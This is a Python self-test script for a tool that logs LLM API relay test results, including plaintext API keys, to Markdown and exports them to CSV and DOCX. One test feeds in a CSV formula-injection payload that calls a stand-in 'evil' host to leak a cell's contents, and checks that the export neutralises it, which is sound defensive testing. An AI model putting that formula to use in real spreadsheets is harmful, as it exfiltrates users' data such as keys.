#!/usr/bin/env python3
"""Self-test for scripts/ledger.py + scripts/ledger_export.py (channel ledger). No network, stdlib only. Exit 0 = all pass.
  python selftest_ledger.py
Everything runs in a TemporaryDirectory via --ledger / cwd; the fake key below is never a real key.
"""
import csv, io, os, subprocess, sys, tempfile, zipfile
from concurrent.futures import ThreadPoolExecutor
from xml.dom import minidom

HERE = os.path.dirname(os.path.abspath(__file__))
SKILL = os.path.dirname(HERE)
SCRIPTS = os.path.join(SKILL, "scripts")
LEDGER_PY = os.path.join(SCRIPTS, "ledger.py")
sys.path.insert(0, SCRIPTS)

FAKE = "sk-TESTKEY1234567890abcdef"
MASKED = "sk-T…cdef"
HEADERS = ["时间", "站点", "API Key", "模型真伪", "渠道真伪", "评级", "评分"]
results = []


def case(name):
    def deco(fn):
        def run():
            try:
                msg = fn()
                if msg and msg.startswith("SKIP"):
                    results.append((name, "SKIP", msg))
                    print("SKIP", name, "-", msg)
                else:
                    results.append((name, "PASS", ""))
                    print("PASS", name)
            except AssertionError as e:
                results.append((name, "FAIL", str(e)))
                print("FAIL", name, "-", e)
            except Exception as e:  # noqa
                results.append((name, "FAIL", "exception %r" % (e,)))
                print("FAIL", name, "- exception %r" % (e,))
        run.__name__ = fn.__name__
        CASES.append(run)
        return run
    return deco


CASES = []


def ok(cond, msg):
    if not cond:
        raise AssertionError(msg)


def run(args, key=FAKE, env_extra=None, cwd=None, drop_env=()):
    env = dict(os.environ, PYTHONUTF8="1", PYTHONIOENCODING="utf-8")
    env.pop("LLM_API_KEY", None)
    env.pop("LLM_LEDGER", None)
    if key is not None:
        env["LLM_API_KEY"] = key
    env.update(env_extra or {})
    for d in drop_env:
        env.pop(d, None)
    p = subprocess.run([sys.executable, LEDGER_PY] + list(args), capture_output=True, env=env, cwd=cwd, timeout=60)
    return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")


def add(ledger, base="https://api.example.com/v1", score=76, models=("m1=真", "m2=假"), channel="真", ctype="new-api 中转",
        time="2026-11-03 14:20", key=FAKE, extra=()):
    args = ["--base", base, "--score", str(score), "--channel", channel, "--ledger", ledger, "--time", time]
    for m in models:
        args += ["--model", m]
    if ctype is not None:
        args += ["--channel-type", ctype]
    args += list(extra)
    return run(args, key=key)


def read(p):
    with open(p, encoding="utf-8") as f:
        return f.read()


def data_rows(md):
    import ledger_export
    return ledger_export.parse_ledger(md)[1]


def lines_with(md, s):
    return [ln for ln in md.splitlines() if s in ln]


class Tmp:
    def __enter__(self):
        self.td = tempfile.TemporaryDirectory(prefix="selftest_ledger_")
        self.dir = self.td.name
        return self

    def __exit__(self, *a):
        self.td.cleanup()

    def p(self, name="ledger.md"):
        return os.path.join(self.dir, name)


# ---------------------------------------------------------------- basics
@case("header written once + warning text, new row appended")
def _():
    with Tmp() as t:
        L = t.p()
        rc, out, err = add(L)
        ok(rc == 0, "rc=%s err=%s" % (rc, err))
        rc, out, err = add(L, base="https://other.example.org", key="sk-OTHERKEY0987654321zzzz")
        ok(rc == 0, "second rc=%s" % rc)
        md = read(L)
        ok(md.count("# LLM 渠道测试台账") == 1, "title count")
        ok(md.count("⚠ 含明文 API Key，勿提交/外传。") == 1, "warning count")
        ok(md.count("| 时间 | 站点 | API Key | 模型真伪 | 渠道真伪 | 评级 | 评分 |") == 1, "header row count")
        ok(md.count("|---|---|---|---|---|---|---|") == 1, "separator count")
        rows = data_rows(md)
        ok(len(rows) == 2, "rows=%d" % len(rows))
        r = rows[0]
        ok(r == ["2026-11-03 14:20", "api.example.com", FAKE, "m1：真；m2：假", "真（new-api 中转）", "D", "76"], "row0=%r" % (r,))


@case("add: plaintext key stored in md")
def _():
    with Tmp() as t:
        add(t.p())
        ok(FAKE in read(t.p()), "full key should be in ledger")


@case("upsert: same site+key overwrites in place, others untouched")
def _():
    with Tmp() as t:
        L = t.p()
        add(L, base="a.example.com", key="sk-AAAAAAAAAAAA1111", time="2026-11-01 10:00", models=("m=真",), score=90)
        add(L, base="b.example.com", key=FAKE, time="2026-11-01 11:00", models=("m=真",), score=80)
        add(L, base="c.example.com", key="sk-CCCCCCCCCCCC3333", time="2026-11-01 12:00", models=("m=真",), score=70)
        before = data_rows(read(L))
        ok(len(before) == 3, "setup rows")
        rc, out, err = add(L, base="https://b.example.com/v1", key=FAKE, time="2026-11-05 09:30", models=("m=真",), score=55)
        ok(rc == 0, err)
        after = data_rows(read(L))
        ok(len(after) == 3, "row count changed: %d" % len(after))
        ok(after[0] == before[0] and after[2] == before[2], "neighbours changed")
        ok(after[1][0] == "2026-11-05 09:30" and after[1][5] == "D" and after[1][6] == "55", "row1=%r" % (after[1],))
        ok(after[1][1] == "b.example.com" and after[1][2] == FAKE, "row1 id")
        ok(read(L).count("时间") == 1, "header duplicated")


@case("upsert: same site different key -> append")
def _():
    with Tmp() as t:
        L = t.p()
        add(L, key="sk-KEYONE1234567890")
        add(L, key="sk-KEYTWO1234567890")
        rows = data_rows(read(L))
        ok(len(rows) == 2 and rows[0][2] != rows[1][2], "rows=%r" % (rows,))


@case("upsert: different site same key -> append")
def _():
    with Tmp() as t:
        L = t.p()
        add(L, base="a.example.com")
        add(L, base="b.example.com")
        ok(len(data_rows(read(L))) == 2, "should append")


@case("key missing: recorded 未记录, stderr warns, always appends")
def _():
    with Tmp() as t:
        L = t.p()
        for _i in range(2):
            rc, out, err = add(L, key=None)
            ok(rc == 0, "rc=%s %s" % (rc, err))
            ok(err.strip() != "", "expected stderr warning")
        rows = data_rows(read(L))
        ok(len(rows) == 2 and all(r[2] == "未记录" for r in rows), "rows=%r" % (rows,))
        ok("未记录" in out, "stdout should mention 未记录: %r" % out)
        rc, out, err = add(L, key="")
        ok(len(data_rows(read(L))) == 3 and data_rows(read(L))[2][2] == "未记录", "empty key treated as missing")


@case("pipe and Chinese round-trip (escape \\|)")
def _():
    with Tmp() as t:
        L = t.p()
        rc, out, err = add(L, models=("a|b=真", "模型-中文|x=假"), ctype="中转 | 站点|混合")
        ok(rc == 0, err)
        md = read(L)
        ok("a\\|b" in md and "中转 \\| 站点\\|混合" in md, "pipes not escaped: %r" % md)
        r = data_rows(md)[0]
        ok(r[3] == "a|b：真；模型-中文|x：假", "models cell=%r" % r[3])
        ok(r[4] == "真（中转 | 站点|混合）", "channel cell=%r" % r[4])
        ok(len(r) == 7, "cell count %d" % len(r))
        # upsert still finds the row when it contains escaped pipes
        add(L, models=("a|b=真",), ctype="x|y", time="2026-11-06 01:02")
        rows = data_rows(read(L))
        ok(len(rows) == 1 and rows[0][4] == "真（x|y）", "rows=%r" % (rows,))


# ---------------------------------------------------------------- rating
@case("rating boundaries and fake overrides")
def _():
    table = [(59, ("m=真",), "真", "D"), (60, ("m=真",), "真", "C"), (69, ("m=真",), "真", "C"), (70, ("m=真",), "真", "B"),
             (84, ("m=真",), "真", "B"), (85, ("m=真",), "真", "A"), (100, ("m=真",), "真", "A"), (0, ("m=真",), "真", "D"),
             (95, ("m1=真", "m2=假"), "真", "D"), (95, ("m=真",), "假", "D"), (95, ("m=假",), "假", "D"), (70, ("m=假",), "真", "D")]
    with Tmp() as t:
        for score, models, ch, want in table:
            L = t.p("r.md")
            if os.path.exists(L):
                os.remove(L)
            rc, out, err = add(L, score=score, models=models, channel=ch, ctype=None)
            ok(rc == 0, "rc=%s %s" % (rc, err))
            r = data_rows(read(L))[0]
            ok(r[5] == want and r[6] == str(score), "score=%s models=%s ch=%s -> %s (want %s)" % (score, models, ch, r[5], want))
            ok(out.strip().splitlines()[-1] == want, "stdout last line %r want %s" % (out, want))
            ok(r[4] == ch, "channel cell without type should be bare: %r" % r[4])


# ---------------------------------------------------------------- site / path
@case("site parsing: port kept, scheme optional, path stripped")
def _():
    cases = [("https://api.example.com/v1", "api.example.com"), ("http://127.0.0.1:8080/v1/chat", "127.0.0.1:8080"),
             ("api.example.com", "api.example.com"), ("api.example.com/v1", "api.example.com"),
             ("localhost:3000/v1", "localhost:3000"), ("https://relay.example.net:8443", "relay.example.net:8443")]
    with Tmp() as t:
        for base, want in cases:
            L = t.p("s.md")
            if os.path.exists(L):
                os.remove(L)
            rc, out, err = add(L, base=base)
            ok(rc == 0, "%s rc=%s %s" % (base, rc, err))
            got = data_rows(read(L))[0][1]
            ok(got == want, "%s -> %r want %r" % (base, got, want))


@case("ledger path priority: --ledger > LLM_LEDGER > ./llm-channel-ledger.md")
def _():
    with Tmp() as t:
        cwd = os.path.join(t.dir, "cwd")
        os.makedirs(cwd)
        a, b = t.p("arg.md"), t.p("env.md")
        base_args = ["--base", "x.example.com", "--score", "80", "--model", "m=真", "--channel", "真", "--time", "2026-11-03 10:00"]
        # 1) default -> cwd
        rc, out, err = run(base_args, cwd=cwd)
        ok(rc == 0, err)
        ok(os.path.exists(os.path.join(cwd, "llm-channel-ledger.md")), "default file missing in cwd: %s" % os.listdir(cwd))
        ok(os.path.realpath(out.splitlines()[0].strip()) == os.path.realpath(os.path.join(cwd, "llm-channel-ledger.md")), "stdout path %r" % out)
        # 2) env beats default
        rc, out, err = run(base_args, cwd=cwd, env_extra={"LLM_LEDGER": b})
        ok(rc == 0 and os.path.exists(b), "env ledger not used: %s" % err)
        ok(len(data_rows(read(os.path.join(cwd, "llm-channel-ledger.md")))) == 1, "default file should be untouched by env run")
        # 3) --ledger beats env
        rc, out, err = run(base_args + ["--ledger", a], cwd=cwd, env_extra={"LLM_LEDGER": b})
        ok(rc == 0 and os.path.exists(a), "--ledger not used: %s" % err)
        ok(len(data_rows(read(b))) == 1, "env file should be untouched by --ledger run")


@case("refuse to write inside skill directory (rc 2, nothing created)")
def _():
    targets = [os.path.join(SKILL, "ledger_should_not_exist.md"), os.path.join(SCRIPTS, "ledger_should_not_exist.md"),
               os.path.join(HERE, "sub", "ledger_should_not_exist.md")]
    for p in targets:
        rc, out, err = add(p)
        ok(rc == 2, "%s rc=%s" % (p, rc))
        ok(not os.path.exists(p) and not os.path.exists(os.path.splitext(p)[0] + ".csv"), "file created at %s" % p)
        ok(not os.path.isdir(os.path.dirname(p)) or os.path.basename(os.path.dirname(p)) != "sub", "dir created")
    # via env + via cwd default
    rc, out, err = run(["--base", "x.com", "--score", "80", "--model", "m=真", "--channel", "真"], cwd=SKILL,
                       env_extra={"LLM_LEDGER": targets[0]})
    ok(rc == 2 and not os.path.exists(targets[0]), "env path into skill dir, rc=%s" % rc)
    rc, out, err = run(["--base", "x.com", "--score", "80", "--model", "m=真", "--channel", "真"], cwd=SKILL)
    ok(rc == 2 and not os.path.exists(os.path.join(SKILL, "llm-channel-ledger.md")), "default cwd=skill dir, rc=%s" % rc)
    if os.path.isdir(os.path.join(HERE, "sub")):
        try:
            os.rmdir(os.path.join(HERE, "sub"))
        except OSError:
            pass


# ---------------------------------------------------------------- arg errors
@case("argument errors exit 2")
def _():
    with Tmp() as t:
        L = t.p()
        base = ["--base", "x.example.com", "--ledger", L]
        bad = [["--score", "101", "--model", "m=真", "--channel", "真"], ["--score", "-1", "--model", "m=真", "--channel", "真"],
               ["--score", "abc", "--model", "m=真", "--channel", "真"], ["--score", "7.5", "--model", "m=真", "--channel", "真"],
               ["--score", "80", "--model", "m", "--channel", "真"], ["--score", "80", "--model", "m=maybe", "--channel", "真"],
               ["--score", "80", "--model", "=真", "--channel", "真"], ["--score", "80", "--model", "m=真", "--channel", "maybe"],
               ["--score", "80", "--channel", "真"]]
        for extra in bad:
            rc, out, err = run(base + extra)
            ok(rc == 2, "%r -> rc=%s" % (extra, rc))
            ok(not os.path.exists(L), "ledger created on bad args %r" % (extra,))
            ok(FAKE not in out + err, "key leak on error")
        rc, out, err = run(base + ["--score", "0", "--model", "m=真", "--channel", "真"])
        ok(rc == 0, "score 0 valid, rc=%s %s" % (rc, err))
        rc, out, err = run(base + ["--score", "100", "--model", "m=真", "--channel", "真"])
        ok(rc == 0, "score 100 valid")


# ---------------------------------------------------------------- key safety
@case("stdout/stderr never contain full key; masked key printed")
def _():
    with Tmp() as t:
        L = t.p()
        outs = []
        outs.append(add(L))                                   # normal
        outs.append(add(L))                                   # overwrite
        outs.append(add(L, score=500))                        # error path
        outs.append(add(L, models=("x=bad",)))                # error path
        outs.append(run(["--base", "x.example.com"], key=FAKE))  # missing args
        for rc, out, err in outs:
            ok(FAKE not in out and FAKE not in err, "full key leaked: out=%r err=%r" % (out, err))
            ok("TESTKEY1234567890abc" not in out + err, "key fragment leaked")
        rc, out, err = outs[0]
        ok(MASKED in out, "masked %r not in stdout %r" % (MASKED, out))
        lines = [ln for ln in out.splitlines() if ln.strip()]
        ok(len(lines) == 3, "stdout should be path, masked key, grade; got %r" % lines)
        ok(os.path.realpath(lines[0].strip()) == os.path.realpath(L), "stdout path %r" % lines[0])
        ok(lines[2].strip() in "ABCD", "grade line %r" % lines[2])
        # short key -> ***
        rc, out, err = add(t.p("short.md"), key="sk-short")
        ok(rc == 0 and "***" in out and "sk-short" not in out + err, "short key mask: %r %r" % (out, err))
        # key via argv must not exist
        rc, out, err = run(["--base", "x.com", "--score", "80", "--model", "m=真", "--channel", "真", "--ledger", t.p("z.md"),
                            "--api-key", FAKE], key=None)
        ok(rc == 2 and not os.path.exists(t.p("z.md")), "--api-key must not exist as an option, rc=%s" % rc)  # (argparse echoes unknown argv itself; not asserted)


# ---------------------------------------------------------------- concurrency
@case("10 concurrent processes: 10 rows, one header, no corruption")
def _():
    with Tmp() as t:
        L = t.p()

        def one(i):
            return add(L, base="site%d.example.com" % i, key="sk-CONCURRENT%02d1234567890" % i, score=60 + i, models=("m=真",),
                       time="2026-11-03 10:%02d" % i)
        with ThreadPoolExecutor(max_workers=10) as ex:
            res = list(ex.map(one, range(10)))
        for i, (rc, out, err) in enumerate(res):
            ok(rc == 0, "proc %d rc=%s err=%s" % (i, rc, err))
        md = read(L)
        ok(md.count("| 时间 |") == 1 and md.count("# LLM 渠道测试台账") == 1, "header duplicated")
        rows = data_rows(md)
        ok(len(rows) == 10, "rows=%d\n%s" % (len(rows), md))
        ok(sorted(r[1] for r in rows) == sorted("site%d.example.com" % i for i in range(10)), "sites mismatch")
        ok(all(len(r) == 7 for r in rows), "corrupt row")
        ok(not os.path.exists(L + ".lock"), "lock file left behind")
        ok(not [f for f in os.listdir(t.dir) if ".tmp" in f], "temp files left: %s" % os.listdir(t.dir))


# ---------------------------------------------------------------- export
def _check_csv(path, md):
    with open(path, "rb") as f:
        raw = f.read()
    ok(raw[:3] == b"\xef\xbb\xbf", "csv BOM missing: %r" % raw[:3])
    rows = list(csv.reader(io.StringIO(raw.decode("utf-8-sig"), newline="")))
    import ledger_export
    headers, drows = ledger_export.parse_ledger(md)
    ok(rows[0] == HEADERS == headers, "csv header %r" % rows[0])
    ok(rows[1:] == drows, "csv rows differ from md:\n%r\n%r" % (rows[1:], drows))
    return rows


@case("csv export: BOM, round-trip, regenerated on overwrite")
def _():
    with Tmp() as t:
        L = t.p("my-ledger.md")
        add(L, models=("a|b=真", "m2=假"), ctype="含,逗号 \"引号\"")
        add(L, base="o.example.com", key="sk-OTHERKEY0987654321zzzz")
        c = t.p("my-ledger.csv")
        ok(os.path.exists(c), "csv not created next to ledger (stem)")
        rows = _check_csv(c, read(L))
        ok(len(rows) == 3, "csv rows %d" % len(rows))
        ok(rows[1][3] == "a|b：真；m2：假" and rows[1][4] == "真（含,逗号 \"引号\"）", "special chars %r" % (rows[1],))
        add(L, score=99, models=("m=真",), ctype="new", time="2026-12-01 00:00")   # overwrite row 1
        rows = _check_csv(c, read(L))
        ok(len(rows) == 3 and rows[1][6] == "99" and rows[1][5] == "A" and rows[1][0] == "2026-12-01 00:00", "csv not updated: %r" % (rows[1],))


def _xml_ok(zf):
    n = 0
    for name in zf.namelist():
        if name.endswith(".xml") or name.endswith(".rels"):
            minidom.parseString(zf.read(name))
            n += 1
    return n


@case("docx export: zip valid, all XML parseable")
def _():
    with Tmp() as t:
        L = t.p("my-ledger.md")
        add(L, models=("a|b=真",), ctype="<b>&amp; 特殊</b>")
        d = t.p("my-ledger.docx")
        ok(os.path.exists(d), "docx not created")
        with zipfile.ZipFile(d) as zf:
            ok(zf.testzip() is None, "testzip failed")
            names = zf.namelist()
            ok("[Content_Types].xml" in names and "word/document.xml" in names, "missing core parts: %s" % names)
            ok(_xml_ok(zf) >= 3, "too few xml parts")
            ok("LLM 渠道测试台账" in zf.read("word/document.xml").decode("utf-8"), "title missing in document.xml")


def _table_matches(path, md):
    import ledger_export
    from docx import Document
    headers, rows = ledger_export.parse_ledger(md)
    doc = Document(path)
    ok(len(doc.tables) >= 1, "no table in docx")
    tb = doc.tables[0]
    got = [[c.text for c in r.cells] for r in tb.rows]
    ok(len(got) in (len(rows), len(rows) + 1), "docx table rows %d vs %d data rows" % (len(got), len(rows)))
    ok(all(len(r) == len(headers) for r in got), "docx col count %r" % [len(r) for r in got])
    if len(got) == len(rows) + 1:
        ok(got[0] == headers, "docx header %r" % got[0])
        got = got[1:]
    ok(got == rows, "docx cell text differs:\n%r\n%r" % (got, rows))
    return doc


@case("docx export: python-docx read-back (optional)")
def _():
    try:
        import docx  # noqa
    except ImportError:
        return "SKIP python-docx not installed"
    with Tmp() as t:
        L = t.p("my-ledger.md")
        add(L, models=("a|b=真", "m2=假"), ctype="中转 | 站点")
        add(L, base="o.example.com", key="sk-OTHERKEY0987654321zzzz", score=90, models=("m=真",))
        _table_matches(t.p("my-ledger.docx"), read(L))
        # overwrite regenerates docx too
        add(L, score=61, models=("m=真",), ctype="改", time="2026-12-01 00:00")
        _table_matches(t.p("my-ledger.docx"), read(L))
        ok(any("61" in [c.text for c in r.cells] for r in __import__("docx").Document(t.p("my-ledger.docx")).tables[0].rows),
           "overwrite not reflected in docx")


@case("ledger_export API: parse_ledger / write_csv / write_docx direct")
def _():
    import ledger_export
    md = ("# T\n> w\n\n| a | b |\n|---|---|\n| 1 | x\\|y |\n| 中 | |\n")
    h, r = ledger_export.parse_ledger(md)
    ok(h == ["a", "b"] and r == [["1", "x|y"], ["中", ""]], "parse %r %r" % (h, r))
    ok(ledger_export.parse_ledger("") == ([], []) or ledger_export.parse_ledger("")[1] == [], "empty parse")
    with Tmp() as t:
        ledger_export.write_csv(h, r, t.p("x.csv"))
        ok(open(t.p("x.csv"), "rb").read(3) == b"\xef\xbb\xbf", "BOM")
        ledger_export.write_docx(h, r, t.p("x.docx"), "标题")
        with zipfile.ZipFile(t.p("x.docx")) as zf:
            ok(zf.testzip() is None, "zip")
            _xml_ok(zf)
        ledger_export.write_csv(h, [], t.p("e.csv"))
        ledger_export.write_docx(h, [], t.p("e.docx"), "空")
        with zipfile.ZipFile(t.p("e.docx")) as zf:
            ok(zf.testzip() is None, "empty zip")
            _xml_ok(zf)


@case("review fixes: csv formula injection neutralised (md/docx untouched)")
def _():
    with Tmp() as t:
        L = t.p("led.md")
        rc, out, err = add(L, models=('=IMPORTDATA("http://evil/?"&C2)=真',))
        ok(rc == 0, "rc=%s %s" % (rc, err))
        with open(t.p("led.csv"), encoding="utf-8-sig", newline="") as f:
            rows = list(csv.reader(f))
        ok(rows[1][3].startswith("'="), "csv cell not neutralised: %r" % rows[1][3])
        ok("=IMPORTDATA" in read(L), "md should keep the raw text")
        ok(not any(c.startswith("=") for r in rows for c in r), "a csv cell still starts with =")


@case("review fixes: ledger path must end in .md (no csv/docx collision)")
def _():
    with Tmp() as t:
        for name in ("x.csv", "x.docx", "x.txt"):
            rc, out, err = add(t.p(name))
            ok(rc == 2 and not os.path.exists(t.p(name)), "%s rc=%s" % (name, rc))


@case("review fixes: inside_skill resists \\\\?\\ and admin-share spellings; other drives allowed")
def _():
    import ledger
    inner = os.path.join(ledger.SKILL_ROOT, "x.md")
    ok(ledger.inside_skill(inner), "plain path")
    ok(ledger.inside_skill(os.path.join(ledger.SKILL_ROOT, "..", os.path.basename(ledger.SKILL_ROOT), "x.md")), ".. path")
    if os.name == "nt":
        drive = os.path.splitdrive(inner)[0]
        ok(ledger.inside_skill("\\\\?\\" + inner), "\\\\?\\ prefix")
        ok(ledger.inside_skill("\\\\localhost\\%s$%s" % (drive[0], inner[len(drive):])), "admin share")
        other = "Z:\\ledger.md" if drive.upper() != "Z:" else "Y:\\ledger.md"
        ok(not ledger.inside_skill(other), "other drive must not be refused")
    ok(not ledger.inside_skill(os.path.join(tempfile.gettempdir(), "ledger.md")), "temp dir must be allowed")


@case("review fixes: hand-edited md (extra tables, notes, CRLF) is not corrupted")
def _():
    with Tmp() as t:
        L = t.p("led.md")
        add(L)
        md = read(L).rstrip("\n") + "\n\n## Notes\n\n| 项 | 值 |\n|---|---|\n| a | b |\n"
        with open(L, "w", encoding="utf-8", newline="") as f:
            f.write(md.replace("\n", "\r\n"))
        rc, _o, err = add(L, base="https://new.example.org", key="sk-NEWKEY0987654321zzzz")
        ok(rc == 0, err)
        out = read(L)
        ok("\r" not in out, "CRLF should be normalised")
        rows = data_rows(out)
        ok([r[1] for r in rows] == ["api.example.com", "new.example.org"], "rows=%r" % [r[1] for r in rows])
        ok(out.index("new.example.org") < out.index("## Notes"), "new row must land in the ledger table, not Notes")
        ok("| a | b |" in out, "notes table must be intact")
    with Tmp() as t:  # file without a ledger table: fresh table appended, no key promoted to a header
        L = t.p("led.md")
        with open(L, "w", encoding="utf-8") as f:
            f.write("# my ledger\n")
        ok(add(L)[0] == 0, "add")
        h, rows = __import__("ledger_export").parse_ledger(read(L))
        ok(h == HEADERS and len(rows) == 1, "headers=%r rows=%r" % (h, rows))


@case("review fixes: key with inner whitespace still overwrites")
def _():
    with Tmp() as t:
        L = t.p("led.md")
        add(L, key="sk-A  B-1234567890abcdefgh")
        add(L, key="sk-A  B-1234567890abcdefgh", score=90, models=("m1=真",), ctype="x")
        rows = data_rows(read(L))
        ok(len(rows) == 1 and rows[0][5] == "A", "rows=%r" % (rows,))


@case("review fixes: argv key / bad --base never echoed; abbreviations rejected")
def _():
    with Tmp() as t:
        L = t.p("led.md")
        rc, out, err = run(["--base", "https://u:%s@/v1" % FAKE, "--score", "70", "--model", "m=真", "--channel", "真", "--ledger", L])
        ok(rc == 2 and FAKE not in out + err, "bad base: rc=%s err=%r" % (rc, err))
        rc, out, err = run(["--base", "h.example.com", "--score", "70", "--model", "m=真", "--channel", "真", "--ledger", L, "--ke", FAKE])
        ok(rc == 2 and FAKE not in out + err, "extra arg: rc=%s err=%r" % (rc, err))
        ok(not os.path.exists(L), "nothing should be written on argument errors")


@case("review fixes: stale lock heals within one run; live lock times out with rc 2")
def _():
    import time as _t
    with Tmp() as t:
        L = t.p("led.md")
        lock = L + ".lock"
        with open(lock, "w") as f:
            f.write("999999:dead")
        old = _t.time() - 120
        os.utime(lock, (old, old))
        rc, out, err = add(L)
        ok(rc == 0 and not os.path.exists(lock), "stale lock: rc=%s err=%s" % (rc, err))


@case("no stray files: only ledger/csv/docx in target dir")
def _():
    with Tmp() as t:
        add(t.p("led.md"))
        add(t.p("led.md"), base="b.example.com")
        ok(sorted(os.listdir(t.dir)) == ["led.csv", "led.docx", "led.md"], "dir has %s" % sorted(os.listdir(t.dir)))


def main():
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    before = set(os.listdir(SKILL)) | {"tests/" + f for f in os.listdir(HERE)}
    for c in CASES:
        c()
    after = set(os.listdir(SKILL)) | {"tests/" + f for f in os.listdir(HERE)}
    stray = {x for x in after - before if not x.endswith("__pycache__")}
    if stray:
        results.append(("no files left in skill dir", "FAIL", "stray: %s" % sorted(stray)))
        print("FAIL no files left in skill dir -", sorted(stray))
    else:
        results.append(("no files left in skill dir", "PASS", ""))
        print("PASS no files left in skill dir")
    npass = sum(1 for r in results if r[1] == "PASS")
    nfail = sum(1 for r in results if r[1] == "FAIL")
    nskip = sum(1 for r in results if r[1] == "SKIP")
    print("selftest_ledger: %d PASS, %d FAIL, %d SKIP -> %s" % (npass, nfail, nskip, "FAIL" if nfail else "ok"))
    return 1 if nfail else 0


if __name__ == "__main__":
    sys.exit(main())
